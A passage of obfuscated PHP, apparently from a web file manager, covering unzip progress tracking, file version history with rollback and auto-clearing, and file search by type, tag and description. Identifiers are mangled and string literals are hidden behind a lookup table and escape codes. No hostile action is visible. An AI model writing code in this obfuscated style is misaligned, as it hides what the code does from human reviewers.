(!$Ğµƒ¦Üò || count($Ğµƒ¦Üò) <= 0) { return; } $š™¶‡ëÊ = !1; $Ï“íÎÏˆ = timeFloat(); $Œ¶åÅÜ¦ = array(); foreach ($Ğµƒ¦Üò as $†ÜõÛÔ => $Ï‘é´ÚÑ) { if ($Ï“íÎÏˆ - $Ï‘é´ÚÑ[$«Ë¡ŞÄ¼[1903]] > $Ï‘é´ÚÑ[$«Ë¡ŞÄ¼[207]]) { $š™¶‡ëÊ = !0; try { Hook::apply($Ï‘é´ÚÑ[$«Ë¡ŞÄ¼[344]], $Ï‘é´ÚÑ[$«Ë¡ŞÄ¼[1892]]); write_log($«Ë¡ŞÄ¼[1906] . $†ÜõÛÔ . $«Ë¡ŞÄ¼[74] . $Ï‘é´ÚÑ[$«Ë¡ŞÄ¼[344]] . $«Ë¡ŞÄ¼[1907] . ACTION, $«Ë¡ŞÄ¼[198]); } catch (Exception $Ì¬Ûåı) { } continue; } $Œ¶åÅÜ¦[$†ÜõÛÔ] = $Ï‘é´ÚÑ; } if (!$š™¶‡ëÊ) { return; } if (!$Œ¶åÅÜ¦) { return Cache::remove($‰¶…­ûİ); } Cache::set($‰¶…­ûİ, $Œ¶åÅÜ¦, 60); Cache::removeMemory($‰¶…­ûİ); } public static function finished($ÓÎËÅ“ç, $Û¬†„Ø) { $ÌÏ¥«Ãô =& $_SERVER[ıÚ˜š²İ]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($ÌÏ¥«Ãô[344] => $ÓÎËÅ“ç, $ÌÏ¥«Ãô[1892] => $Û¬†„Ø); } private static function finishedRun() { $¦ŸÌ™„† =& $_SERVER[ıÚ˜š²İ]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $öƒˆÈÍ) { try { Hook::apply($öƒˆÈÍ[$¦ŸÌ™„†[344]], $öƒˆÈÍ[$¦ŸÌ™„†[1892]]); } catch (Exception $“½Àèæ) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $¬ŒïÈÚÌ =& $_SERVER[ıÚ˜š²İ]; parent::startAfter(); Hook::bind($¬ŒïÈÚÌ[1908], array($this, $¬ŒïÈÚÌ[1909])); Hook::bind($¬ŒïÈÚÌ[1292], array($this, $¬ŒïÈÚÌ[1910])); Hook::bind($¬ŒïÈÚÌ[1911], array($this, $¬ŒïÈÚÌ[1912])); $Àı–«Î… =& $this->task; $Àı–«Î…[$¬ŒïÈÚÌ[1913]] = $¬ŒïÈÚÌ[1293]; if (!$Àı–«Î…[$¬ŒïÈÚÌ[1680]]) { $Àı–«Î…[$¬ŒïÈÚÌ[1680]] = LNG($¬ŒïÈÚÌ[1914]); } } protected function endAfter() { $Î«×«Éø =& $_SERVER[ıÚ˜š²İ]; parent::endAfter(); Hook::unbind($Î«×«Éø[1908], array($this, $Î«×«Éø[1909])); Hook::unbind($Î«×«Éø[1292], array($this, $Î«×«Éø[1910])); Hook::unbind($Î«×«Éø[1911], array($this, $Î«×«Éø[1912])); } public function updateAfter() { $¶ĞÌÏ« =& $_SERVER[ıÚ˜š²İ]; $Ü¤–¶üÆ =& $this->task; if (!$Ü¤–¶üÆ[$¶ĞÌÏ«[1152]] || !$Ü¤–¶üÆ[$¶ĞÌÏ«[840]]) { if ($Ü¤–¶üÆ[$¶ĞÌÏ«[1913]] != $¶ĞÌÏ«[390]) { return; } } if ($Ü¤–¶üÆ[$¶ĞÌÏ«[1913]] == $¶ĞÌÏ«[1293]) { $©îğØÖ = 0; if ($Ü¤–¶üÆ[$¶ĞÌÏ«[1846]]) { $©îğØÖ = $Ü¤–¶üÆ[$¶ĞÌÏ«[1847]] / $Ü¤–¶üÆ[$¶ĞÌÏ«[1846]]; } $Ü¤–¶üÆ[$¶ĞÌÏ«[1794]] = $©îğØÖ * 0.3; } else { if ($Ü¤–¶üÆ[$¶ĞÌÏ«[1913]] == $¶ĞÌÏ«[390]) { $©îğØÖ = $Ü¤–¶üÆ[$¶ĞÌÏ«[1793]] / $Ü¤–¶üÆ[$¶ĞÌÏ«[1152]]; $Ü¤–¶üÆ[$¶ĞÌÏ«[1794]] = 0.3 + $©îğØÖ * 0.4; } else { if ($Ü¤–¶üÆ[$¶ĞÌÏ«[1913]] == $¶ĞÌÏ«[110]) { $ŒÒæ«÷¦ = 0; if ($Ü¤–¶üÆ[$¶ĞÌÏ«[1848]] == $¶ĞÌÏ«[110]) { $ŒÒæ«÷¦ = $Ü¤–¶üÆ[$¶ĞÌÏ«[1847]]; } $©îğØÖ = ($Ü¤–¶üÆ[$¶ĞÌÏ«[1851]] + $ŒÒæ«÷¦) / $Ü¤–¶üÆ[$¶ĞÌÏ«[840]]; $Ü¤–¶üÆ[$¶ĞÌÏ«[1794]] = 0.3 + 0.4 + $©îğØÖ * 0.3; } } } if ($Ü¤–¶üÆ[$¶ĞÌÏ«[1794]] > 0) { $—Ô‚ÓÃ = timeFloat() - $Ü¤–¶üÆ[$¶ĞÌÏ«[1796]] - $Ü¤–¶üÆ[$¶ĞÌÏ«[1799]]; $Ü¤–¶üÆ[$¶ĞÌÏ«[1800]] = $—Ô‚ÓÃ * (1 - $Ü¤–¶üÆ[$¶ĞÌÏ«[1794]]) / $Ü¤–¶üÆ[$¶ĞÌÏ«[1794]]; } } public function addFile($¬íÇ×Ä) { $²Óñ“± =& $_SERVER[ıÚ˜š²İ]; $¼‘Œˆ› =& $this->task; $äéä²Í‚ = IO::info($¬íÇ×Ä); $¼‘Œˆ›[$²Óñ“±[1844]] = $äéä²Í‚[$²Óñ“±[32]]; $¼‘Œˆ›[$²Óñ“±[1846]] = $äéä²Í‚[$²Óñ“±[79]]; $¼‘Œˆ›[$²Óñ“±[1847]] = 0; $¼‘Œˆ›[$²Óñ“±[1154]] = $²Óñ“±[1867]; $¼‘Œˆ›[$²Óñ“±[1848]] = $²Óñ“±[1293]; $¼‘Œˆ›[$²Óñ“±[840]] = $äéä²Í‚[$²Óñ“±[79]]; $¼‘Œˆ›[$²Óñ“±[1152]] = 1; $Éœ×ÉÂ© = 0; $¼‘Œˆ›[$²Óñ“±[1855]] = array($²Óñ“±[1856] => $Éœ×ÉÂ© + 1, $²Óñ“±[496] => $äéä²Í‚[$²Óñ“±[32]], $²Óñ“±[87] => $äéä²Í‚[$²Óñ“±[87]], $²Óñ“±[586] => $äéä²Í‚[$²Óñ“±[586]] ? $äéä²Í‚[$²Óñ“±[586]] : $äéä²Í‚[$²Óñ“±[87]]); $this->update(); } public function zipEvent($½ƒ§èÄ«, $–·ÉÑÂ‡, $ğ¾èó½, $¾¶¿ÃŸÎ) { $¬ï‡ö´ë =& $_SERVER[ıÚ˜š²İ]; $Ì¡¬ÇÕ =& $this->task; $Ì¡¬ÇÕ[$¬ï‡ö´ë[1844]] = get_path_this($–·ÉÑÂ‡); $Ì¡¬ÇÕ[$¬ï‡ö´ë[1846]] = $¾¶¿ÃŸÎ; $Ì¡¬ÇÕ[$¬ï‡ö´ë[1847]] = $ğ¾èó½; $Ì¡¬ÇÕ[$¬ï‡ö´ë[1154]] = $½ƒ§èÄ« == $¬ï‡ö´ë[1915] ? $¬ï‡ö´ë[1916] : $¬ï‡ö´ë[1917]; $Ì¡¬ÇÕ[$¬ï‡ö´ë[1848]] = $¬ï‡ö´ë[12]; $Ì¡¬ÇÕ[$¬ï‡ö´ë[840]] = $¾¶¿ÃŸÎ; $Ì¡¬ÇÕ[$¬ï‡ö´ë[1913]] = $¬ï‡ö´ë[390]; $this->update(); } public function unzipAfter($ÈëŞĞ”) { $èæèè‘ö =& $_SERVER[ıÚ˜š²İ]; $Æáıê…× =& $this->task; $Æáıê…×[$èæèè‘ö[1913]] = $èæèè‘ö[110]; $æÍæğœ¶ = IO::infoWithChildren($ÈëŞĞ”); $±äÔ¯ô£ = 0; $Æáıê…×[$èæèè‘ö[1855]] = array($èæèè‘ö[1856] => $±äÔ¯ô£ + 1, $èæèè‘ö[496] => $æÍæğœ¶[$èæèè‘ö[32]], $èæèè‘ö[87] => $æÍæğœ¶[$èæèè‘ö[87]], $èæèè‘ö[586] => $æÍæğœ¶[$èæèè‘ö[586]] ? $æÍæğœ¶[$èæèè‘ö[586]] : $æÍæğœ¶[$èæèè‘ö[87]]); if ($æÍæğœ¶[$èæèè‘ö[33]] == $èæèè‘ö[233]) { $Æáıê…×[$èæèè‘ö[1152]] = 1; } else { $Æáıê…×[$èæèè‘ö[1152]] = $æÍæğœ¶[$èæèè‘ö[82]][$èæèè‘ö[80]]; } $Æáıê…×[$èæèè‘ö[1154]] = $èæèè‘ö[12]; $Æáıê…×[$èæèè‘ö[1848]] = 0; $Æáıê…×[$èæèè‘ö[1793]] = 0; $Æáıê…×[$èæèè‘ö[1846]] = 0; $Æáıê…×[$èæèè‘ö[1847]] = 0; $Æáıê…×[$èæèè‘ö[1844]] = $èæèè‘ö[12]; $Æáıê…×[$èæèè‘ö[1851]] = 0; $Æáıê…×[$èæèè‘ö[840]] = $æÍæğœ¶[$èæèè‘ö[79]]; $this->update(); self::log($èæèè‘ö[1918] . json_encode(array($Æáıê…×, $æÍæğœ¶))); } public function nameParse($‘—¿¨Û‰) { $ÍõÈÍÍ× =& $_SERVER[ıÚ˜š²İ]; $˜¥ÑÁÄÎ =& $this->task; if ($˜¥ÑÁÄÎ[$ÍõÈÍÍ×[1913]] == $ÍõÈÍÍ×[1293]) { $˜¥ÑÁÄÎ[$ÍõÈÍÍ×[1913]] = $ÍõÈÍÍ×[390]; $˜¥ÑÁÄÎ[$ÍõÈÍÍ×[1851]] = 0; $˜¥ÑÁÄÎ[$ÍõÈÍÍ×[840]] = 0; } $¢‚í—ôÜ = get_path_this($‘—¿¨Û‰); if (strstr($¢‚í—ôÜ, $ÍõÈÍÍ×[10])) { $˜¥ÑÁÄÎ[$ÍõÈÍÍ×[1793]] += 1; $˜¥ÑÁÄÎ[$ÍõÈÍÍ×[1152]] += 1; } $˜¥ÑÁÄÎ[$ÍõÈÍÍ×[1844]] = $‘—¿¨Û‰; $this->update(); } } goto d˜š™Ù¥; a¨¤¤Ğª‹Å: class SourceHistoryModel extends ModelBase { protected $tableName = "\151\x6f\137\x73\157\165\162\143\145\137\150\x69\x73\164\157\162\171"; public function historyCount($Ê­°ÜÊ) { $”Œ±ÒÓÀ =& $_SERVER[ıÚ˜š²İ]; if (!$Ê­°ÜÊ) { return array(); } if (is_string($Ê­°ÜÊ) || is_int($Ê­°ÜÊ)) { $Ê­°ÜÊ = array($Ê­°ÜÊ); } $Â´Ò›˜„ = array($”Œ±ÒÓÀ[194], $”Œ±ÒÓÀ[2246] => $”Œ±ÒÓÀ[569]); $€²¾®† = array($”Œ±ÒÓÀ[194] => array($”Œ±ÒÓÀ[7], $Ê­°ÜÊ)); $æÃêÜ¥Š = $this->field($Â´Ò›˜„)->where($€²¾®†)->group($”Œ±ÒÓÀ[194])->select(); return array_to_keyvalue($æÃêÜ¥Š, $”Œ±ÒÓÀ[194], $”Œ±ÒÓÀ[569]); } public function addHistory($ÊÙ·ÌöÉ, $¤Şìø«¿ = '') { $Û­×¼÷” =& $_SERVER[ıÚ˜š²İ]; $¶Åçß£© = array($Û­×¼÷”[493] => $ÊÙ·ÌöÉ[$Û­×¼÷”[194]], $Û­×¼÷”[1783] => isset($ÊÙ·ÌöÉ[$Û­×¼÷”[531]]) ? $ÊÙ·ÌöÉ[$Û­×¼÷”[531]] : $ÊÙ·ÌöÉ[$Û­×¼÷”[529]], $Û­×¼÷”[546] => $ÊÙ·ÌöÉ[$Û­×¼÷”[545]], $Û­×¼÷”[624] => $ÊÙ·ÌöÉ[$Û­×¼÷”[79]], $Û­×¼÷”[2247] => $¤Şìø«¿); if ($GLOBALS[$Û­×¼÷”[6]][$Û­×¼÷”[92]][$Û­×¼÷”[1316]] >= 1) { $this->historyAutoClear($¶Åçß£©[$Û­×¼÷”[194]]); $this->add($¶Åçß£©); } Hook::trigger($Û­×¼÷”[2248], $¶Åçß£©); Model($Û­×¼÷”[2249])->eventFileEdit($ÊÙ·ÌöÉ[$Û­×¼÷”[194]]); } private function historyAutoClear($¾¤º«ßÍ) { $£øæŠÎå =& $_SERVER[ıÚ˜š²İ]; $œÁá‰æ« = Model($£øæŠÎå[847])->get($£øæŠÎå[1338]); $Ì¸ûŠ§´ = intval($GLOBALS[$£øæŠÎå[6]][$£øæŠÎå[92]][$£øæŠÎå[1316]]); $æÓ¸¾ó² = $œÁá‰æ« == $£øæŠÎå[1339] ? min(5, $Ì¸ûŠ§´) : $Ì¸ûŠ§´; $æÓ¸¾ó² = $æÓ¸¾ó² <= 0 ? 0 : $æÓ¸¾ó² - 1; if ($æÓ¸¾ó² >= 499) { return; } $Ñ˜€•±Í = array($£øæŠÎå[493] => $¾¤º«ßÍ); $‚¸©™û¿ = $this->field($£øæŠÎå[2250])->where($Ñ˜€•±Í)->order($£øæŠÎå[2243])->select(); if (!$‚¸©™û¿ || $æÓ¸¾ó² >= count($‚¸©™û¿)) { return; } $ÆÈñÁ = array_to_keyvalue($‚¸©™û¿, $£øæŠÎå[12], $£øæŠÎå[477]); $ÆÈñÁ = array_slice($ÆÈñÁ, $æÓ¸¾ó²); $Ÿ’ÂÊìœ = array_to_keyvalue($‚¸©™û¿, $£øæŠÎå[12], $£øæŠÎå[545]); $Ÿ’ÂÊìœ = array_slice($Ÿ’ÂÊìœ, $æÓ¸¾ó²); if (!$ÆÈñÁ || !$Ÿ’ÂÊìœ) { return; } $Ñ˜€•±Í = array($£øæŠÎå[495] => array($£øæŠÎå[7], $ÆÈñÁ)); $this->where($Ñ˜€•±Í)->delete(); Model($£øæŠÎå[548])->remove($Ÿ’ÂÊìœ); } public function listData($òÂ’”óô) { $€²ªíÄ­ =& $_SERVER[ıÚ˜š²İ]; $úŒ£äª = array($€²ªíÄ­[493] => $òÂ’”óô); $à©¼Çü = $€²ªíÄ­[2251]; $¶Àà¼Øì = $this->field($à©¼Çü)->where($úŒ£äª)->order($€²ªíÄ­[2243])->selectPage(); $this->_listAppendUser($¶Àà¼Øì[$€²ªíÄ­[447]]); $ßşÄŒæÛ = Model($€²ªíÄ­[847])->get($€²ªíÄ­[1338]); $àÉ«Êšñ = 5; if ($ßşÄŒæÛ == $€²ªíÄ­[1339]) { $¶Àà¼Øì[$€²ªíÄ­[447]] = array_slice($¶Àà¼Øì[$€²ªíÄ­[447]], 0, $àÉ«Êšñ); $¶Àà¼Øì[$€²ªíÄ­[444]] = array($€²ªíÄ­[2252] => 1, $€²ªíÄ­[2253] => 20, $€²ªíÄ­[2254] => 1, $€²ªíÄ­[2255] => count($¶Àà¼Øì[$€²ªíÄ­[447]])); } return $¶Àà¼Øì; } protected function _listAppendUser(&$á×“ø—Ğ) { $ÁÙ²‚È‡ =& $_SERVER[ıÚ˜š²İ]; $õ¿Ùšº = array_to_keyvalue($á×“ø—Ğ, $ÁÙ²‚È‡[12], $ÁÙ²‚È‡[1792]); $¬”ù™ = Model($ÁÙ²‚È‡[601])->userListInfo($õ¿Ùšº); foreach ($á×“ø—Ğ as &$Êû³·ˆ˜) { $Æªò´ä® = $Êû³·ˆ˜[$ÁÙ²‚È‡[1792]]; $Êû³·ˆ˜[$ÁÙ²‚È‡[529]] = $¬”ù™[$Æªò´ä®] ? $¬”ù™[$Æªò´ä®] : !1; } unset($Êû³·ˆ˜); } public function fileInfo($ø¥îûµæ, $á‘Ãì’Ì = false) { $öáÑÈâ„ =& $_SERVER[ıÚ˜š²İ]; $Íã¡‡ = $this->tablePrefix; $Œ¤§ÑŸÕ = "{$Íã¡‡}\x69\157\137\x66\151\154\145\x20\146\151\154\x65\x73\x20\x6f\156\40\x66\x69\154\145\x73\x2e\146\x69\154\145\111\x44\40\75\x20\150\151\163\x74\157\x72\171\56\x66\151\x6c\145\x49\x44"; $Ô¿¨¸½õ = $this->alias($öáÑÈâ„[2256])->where(array($öáÑÈâ„[495] => $ø¥îûµæ))->join($Œ¤§ÑŸÕ, $öáÑÈâ„[2257])->find(); if ($Ô¿¨¸½õ && $á‘Ãì’Ì) { $ñ€Èã‘¶ = array($öáÑÈâ„[194] => $Ô¿¨¸½õ[$öáÑÈâ„[194]], $öáÑÈâ„[477] => array($öáÑÈâ„[1102], $ø¥îûµæ)); $Ô¿¨¸½õ[$öáÑÈâ„[1679]] = $this->where($ñ€Èã‘¶)->count(); } return $Ô¿¨¸½õ; } public function removeItem($²¦¶’àµ) { $³šÈÉçÑ =& $_SERVER[ıÚ˜š²İ]; $ ¼…õÛì = array($³šÈÉçÑ[495] => $²¦¶’àµ); $»¨ÛÔ = $this->where($ ¼…õÛì)->find(); if ($»¨ÛÔ) { $à˜ßµŞ¸ = $this->where($ ¼…õÛì)->delete(); Model($³šÈÉçÑ[548])->remove($»¨ÛÔ[$³šÈÉçÑ[545]]); return $à˜ßµŞ¸; } return !1; } public function removeBySource($ñššÙúä) { $É¶Šº‡ =& $_SERVER[ıÚ˜š²İ]; if (!$ñššÙúä) { return !1; } if (!is_array($ñššÙúä)) { $ñššÙúä = array($ñššÙúä); } $Ú¸Ÿ×Åà = array($É¶Šº‡[493] => array($É¶Šº‡[7], $ñššÙúä)); $¥Ã¡Åü = $this->field($É¶Šº‡[546])->where($Ú¸Ÿ×Åà)->select(); if ($¥Ã¡Åü) { $this->where($Ú¸Ÿ×Åà)->delete(); $æ‘½Ö» = array_to_keyvalue($¥Ã¡Åü, $É¶Šº‡[12], $É¶Šº‡[545]); Model($É¶Šº‡[548])->remove($æ‘½Ö»); } return !0; } public function setDetail($ØşÉ½, $ ²ÅòŒ) { $Û™¥ÅÅ =& $_SERVER[ıÚ˜š²İ]; return $this->where(array($Û™¥ÅÅ[495] => $ØşÉ½))->save(array($Û™¥ÅÅ[2247] => $ ²ÅòŒ)); } public function rollbackToItem($‹´›Êçğ, $òÛ£Ì‡­) { $ôÊãÁò© =& $_SERVER[ıÚ˜š²İ]; $Ô©ÊÌË™ = Model($ôÊãÁò©[907])->sourceInfo($‹´›Êçğ); $this->addHistory($Ô©ÊÌË™, LNG($ôÊãÁò©[2258])); $¡ÏóÙøî = $this->find($òÛ£Ì‡­); $–Æµöš¶ = array($ôÊãÁò©[545] => $¡ÏóÙøî[$ôÊãÁò©[545]], $ôÊãÁò©[79] => $¡ÏóÙøî[$ôÊãÁò©[79]], $ôÊãÁò©[88] => time(), $ôÊãÁò©[531] => USER_ID); Model($ôÊãÁò©[907])->where(array($ôÊãÁò©[194] => $‹´›Êçğ))->save($–Æµöš¶); return $this->where(array($ôÊãÁò©[495] => $òÛ£Ì‡­))->delete(); } public function clearSame($‘ºÂôó”) { $’À‰Õ¹® =& $_SERVER[ıÚ˜š²İ]; $©àŞÃ½ = $this->listData($‘ºÂôó”); $À•®ÃÔ = array_to_keyvalue_group($©àŞÃ½, $’À‰Õ¹®[545]); $Çë„ªá = array(); $†Ïş´€– = array(); foreach ($À•®ÃÔ as $„›¤çü×) { if (!$„›¤çü× || count($„›¤çü×) <= 1) { continue; } foreach ($„›¤çü× as $ÙÔ×Ó) { $Çë„ªá[] = $ÙÔ×Ó[$’À‰Õ¹®[545]]; $†Ïş´€–[] = $ÙÔ×Ó[$’À‰Õ¹®[477]]; } } if (!$†Ïş´€–) { return; } $this->where(array($’À‰Õ¹®[477] => array($’À‰Õ¹®[7], $†Ïş´€–)))->delete(); Model($’À‰Õ¹®[548])->remove($Çë„ªá); } public function userSpace() { $­‰Ò—ş” =& $_SERVER[ıÚ˜š²İ]; $±Œ¡íÇ = $this->tablePrefix; $…ğéñ¬Î = array($­‰Ò—ş”[1783] => USER_ID); $½¥ı›Úª = "{$±Œ¡íÇ}\151\157\137\x66\151\154\145\x20\x66\151\154\145\x73\40\x6f\156\40\x66\151\154\145\163\56\x66\x69\x6c\x65\x49\104\40\75\x20\150\x69\163\x74\157\162\x79\56\146\151\154\145\111\x44"; return $this->alias($­‰Ò—ş”[2256])->where($…ğéñ¬Î)->join($½¥ı›Úª, $­‰Ò—ş”[2257])->sum($­‰Ò—ş”[79]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($£¢´Á¼Ä) { $€Á¶€ş =& $_SERVER[ıÚ˜š²İ]; $ß¬İğ¸û = KodIO::fileTypeList(); $´»¢ğ·Ø = $ß¬İğ¸û[$£¢´Á¼Ä]; if (!$´»¢ğ·Ø) { return array(); } $ãÓ¸»®Ï = $´»¢ğ·Ø[$€Á¶€ş[169]]; $ˆşûÙŞì = $€Á¶€ş[7]; if (!$´»¢ğ·Ø[$€Á¶€ş[169]]) { $ïŒƒ” = array_to_keyvalue($ß¬İğ¸û, $€Á¶€ş[12], $€Á¶€ş[169]); $ãÓ¸»®Ï = implode($€Á¶€ş[50], $ïŒƒ”); $ˆşûÙŞì = $€Á¶€ş[2259]; } $êâŠ“­ = explode($€Á¶€ş[50], trim($ãÓ¸»®Ï, $€Á¶€ş[50])); return array($ˆşûÙŞì, $êâŠ“­); } public function listPathType($Ó¾Ã‰¡Ó) { $¨†ÕÁú =& $_SERVER[ıÚ˜š²İ]; $á¨–”×Ì = $this->fileTypeWhere($Ó¾Ã‰¡Ó); if (!$á¨–”×Ì) { return array(); } $”Ï‘é® = USER_ID; $³Í‹Ä÷ = Model($¨†ÕÁú[601])->getInfo($”Ï‘é®); $‰û¨‘«• = array($¨†ÕÁú[655] => SourceModel::TYPE_USER, $¨†ÕÁú[588] => array($¨†ÕÁú[619], $¨†ÕÁú[597] . $³Í‹Ä÷[$¨†ÕÁú[90]][$¨†ÕÁú[194]] . $¨†ÕÁú[620]), $¨†ÕÁú[656] => $”Ï‘é®, $¨†ÕÁú[653] => 0, $¨†ÕÁú[654] => $á¨–”×Ì); return $this->listSource($‰û¨‘«•); } public function listSearch($ªãá™ÖÓ, $¤‚Ö²ê¡ = 300) { $¶ÌÖ»Æø =& $_SERVER[ıÚ˜š²İ]; if (isset($ªãá™ÖÓ[$¶ÌÖ»Æø[2092]]) && $ªãá™ÖÓ[$¶ÌÖ»Æø[2092]]) { $ªãá™ÖÓ[$¶ÌÖ»Æø[2092]] = str_replace($¶ÌÖ»Æø[462], $¶ÌÖ»Æø[2260], trim($ªãá™ÖÓ[$¶ÌÖ»Æø[2092]])); } $ÀÙŸüÔÅ = $this->_parseSearchWhere($ªãá™ÖÓ); if (!isset($ÀÙŸüÔÅ[$¶ÌÖ»Æø[507]])) { $ÀÙŸüÔÅ[$¶ÌÖ»Æø[507]] = 0; } $ĞüşÇ’Ö = $¶ÌÖ»Æø[2261]; $¯ûúØ¼ı = $ÀÙŸüÔÅ; $‚€Â«€£ = $ĞüşÇ’Ö; $this->_listSearchBindPinyin($ªãá™ÖÓ, $ÀÙŸüÔÅ, $ĞüşÇ’Ö); $this->alias($¶ÌÖ»Æø[521])->_makeOrder(); $ÀÙŸüÔÅ = $this->parseWhereLike($ÀÙŸüÔÅ); $×óœŸ¯Î = $this->distinct(!0)->field($ĞüşÇ’Ö)->where($ÀÙŸüÔÅ)->selectPage($¤‚Ö²ê¡); if ($GLOBALS[$¶ÌÖ»Æø[6]][$¶ÌÖ»Æø[459]][$¶ÌÖ»Æø[460]] && Input::check($ªãá™ÖÓ[$¶ÌÖ»Æø[2092]], $¶ÌÖ»Æø[662]) && $×óœŸ¯Î[$¶ÌÖ»Æø[444]][$¶ÌÖ»Æø[430]] == 1 && $×óœŸ¯Î[$¶ÌÖ»Æø[444]][$¶ÌÖ»Æø[445]] == 0) { $×óœŸ¯Î = $this->distinct(!0)->field($ĞüşÇ’Ö)->where($¯ûúØ¼ı)->limit(1000)->select(); $×óœŸ¯Î = array_page_split($×óœŸ¯Î, !1, $¤‚Ö²ê¡); } $this->_listSearchFileContent($×óœŸ¯Î, $ªãá™ÖÓ, $‚€Â«€£, $¯ûúØ¼ı); $this->_listSearchDesc($×óœŸ¯Î, $ªãá™ÖÓ, $‚€Â«€£); $this->_listSearchTag($×óœŸ¯Î, $ªãá™ÖÓ, $‚€Â«€£); $this->_listSearchGroupTag($×óœŸ¯Î, $ªãá™ÖÓ, $‚€Â«€£); $this->_listDataApply($×óœŸ¯Î[$¶ÌÖ»Æø[447]]); $this->_listMake($×óœŸ¯Î); return $×óœŸ¯Î; } private function _listSearchFileContent(&$è©„î­’, $ˆ®Ë×±, $Ã–•›Çı, $‚Ó°‡öı) { $ìŸúÚ˜ =& $_SERVER[ıÚ˜š²İ]; if (!$ˆ®Ë×±[$ìŸúÚ˜[2092]] || $è©„î­’[$ìŸúÚ˜[444]][$ìŸúÚ˜[430]] > 1) { return; } if (!isset($‚Ó°‡öı[$ìŸúÚ˜[32]]) || !is_array($ˆ®Ë×±[$ìŸúÚ˜[545]])) { return; } $‚Ó°‡öı[$ìŸúÚ˜[545]] = array($ìŸúÚ˜[7], $ˆ®Ë×±[$ìŸúÚ˜[545]]); unset($‚Ó°‡öı[$ìŸúÚ˜[32]]); unset($ˆ®Ë×±[$ìŸúÚ˜[545]]); $‘¿œêËÔ = $this->field($Ã–•›Çı)->where($‚Ó°‡öı)->limit($ìŸúÚ˜[2262])->select(); if (!$‘¿œêËÔ || count($‘¿œêËÔ) == 0) { return; } $è©„î­’[$ìŸúÚ˜[447]] = array_merge($‘¿œêËÔ, $è©„î­’[$ìŸúÚ˜[447]]); $è©„î­’[$ìŸúÚ˜[444]][$ìŸúÚ˜[445]] += count($‘¿œêËÔ); } private function _listSearchTag(&$àò’»şÍ, $³íÛóÒ, $«ÊÖ®´€) { $ Ò†ˆ£† =& $_SERVER[ıÚ˜š²İ]; if (empty($³íÛóÒ[$ Ò†ˆ£†[1952]]) || !in_array($ Ò†ˆ£†[2263], $³íÛóÒ[$ Ò†ˆ£†[1952]])) { return; } if (!$³íÛóÒ[$ Ò†ˆ£†[2092]] || $àò’»şÍ[$ Ò†ˆ£†[444]][$ Ò†ˆ£†[430]] > 1) { return; } $—¾áñÙ› = Model($ Ò†ˆ£†[2264])->listData(); $Î„Çñ˜§ = array(); $­¾õ”´ì = $³íÛóÒ[$ Ò†ˆ£†[2092]]; foreach ($—¾áñÙ› as $á™©…³Ø) { $˜èÊÄªŠ = $á™©…³Ø[$ Ò†ˆ£†[32]]; $‚ê›ŸäÖ = str_replace($ Ò†ˆ£†[53], $ Ò†ˆ£†[12], Pinyin::get($˜èÊÄªŠ)); if (stripos($˜èÊÄªŠ, $­¾õ”´ì) !== !1 || stripos($‚ê›ŸäÖ, $­¾õ”´ì) !== !1) { $Î„Çñ˜§[] = $á™©…³Ø[$ Ò†ˆ£†[477]]; } } if (!$Î„Çñ˜§) { return; } $¿å€î—¨ = array($ Ò†ˆ£†[502] => array($ Ò†ˆ£†[7], $Î„Çñ˜§), $ Ò†ˆ£†[1792] => USER_ID); $œˆèÜñ = Model($ Ò†ˆ£†[504])->field($ Ò†ˆ£†[87])->where($¿å€î—¨)->select(); $œˆèÜñ = array_to_keyvalue($œˆèÜñ, $ Ò†ˆ£†[12], $ Ò†ˆ£†[87]); $…å‚÷…« = array_unique($œˆèÜñ); $this->_listSearchMerge($àò’»şÍ, $³íÛóÒ, $«ÊÖ®´€, $…å‚÷…«); } private function _listSearchDesc(&$šõâ¶Ÿå, $±ĞÌ·”, $ó²¼°¤) { $ÇéŠú¾Ê =& $_SERVER[ıÚ˜š²İ]; if (empty($±ĞÌ·”[$ÇéŠú¾Ê[1952]]) || !in_array($ÇéŠú¾Ê[528], $±ĞÌ·”[$ÇéŠú¾Ê[1952]])) { return; } if (!$±ĞÌ·”[$ÇéŠú¾Ê[2092]] || $šõâ¶Ÿå[$ÇéŠú¾Ê[444]][$ÇéŠú¾Ê[430]] > 1) { return; } $ÃçÅ¸½° = array($ÇéŠú¾Ê[97] => $ÇéŠú¾Ê[528], $ÇéŠú¾Ê[452] => array($ÇéŠú¾Ê[461], $ÇéŠú¾Ê[2094] . $±ĞÌ·”[$ÇéŠú¾Ê[2092]] . $ÇéŠú¾Ê[2094])); $Á„ŞÖëÃ = !1; if ($Á„ŞÖëÃ) { $™Œòè© = $this->listSearchChildren($±ĞÌ·”[$ÇéŠú¾Ê[193]]); $™Œòè© = array_unique($™Œòè©); if (!$™Œòè©) { return; } $ÃçÅ¸½°[$ÇéŠú¾Ê[194]] = array($ÇéŠú¾Ê[7], $™Œòè©); } $ö…õ¨„¡ = Model($ÇéŠú¾Ê[639])->field($ÇéŠú¾Ê[194])->where($ÃçÅ¸½°)->limit(5000)->select(); $®¿êœ—Â = array_to_keyvalue($ö…õ¨„¡, $ÇéŠú¾Ê[12], $ÇéŠú¾Ê[194]); $this->_listSearchMerge($šõâ¶Ÿå, $±ĞÌ·”, $ó²¼°¤, $®¿êœ—Â); } private function _listSearchGroupTag(&$Ÿ”®Îïá, $ÚÊ•Ù, $ÛÎÈãúÃ) { $ñËÅ™ª© =& $_SERVER[ıÚ˜š²İ]; if (empty($ÚÊ•Ù[$ñËÅ™ª©[1952]]) || !in_array($ñËÅ™ª©[2263], $ÚÊ•Ù[$ñËÅ™ª©[1952]])) { return; } if (!$ÚÊ•Ù[$ñËÅ™ª©[2092]] || $Ÿ”®Îïá[$ñËÅ™ª©[444]][$ñËÅ™ª©[430]] > 1 || !$ÚÊ•Ù[$ñËÅ™ª©[193]]) { return; } $£ëÈâÓ© = $this->sourceInfo($ÚÊ•Ù[$ñËÅ™ª©[193]]); if (!$£ëÈâÓ© || $£ëÈâÓ©[$ñËÅ™ª©[191]] != SourceModel::TYPE_GROUP) { return; } $ıƒ¦¥ßÌ = $£ëÈâÓ©[$ñËÅ™ª©[573]]; $¢«Ò…… = Model($ñËÅ™ª©[2265])->get($ıƒ¦¥ßÌ); $¿©´«úû = array(); $¶Šñğ´ = $ÚÊ•Ù[$ñËÅ™ª©[2092]]; foreach 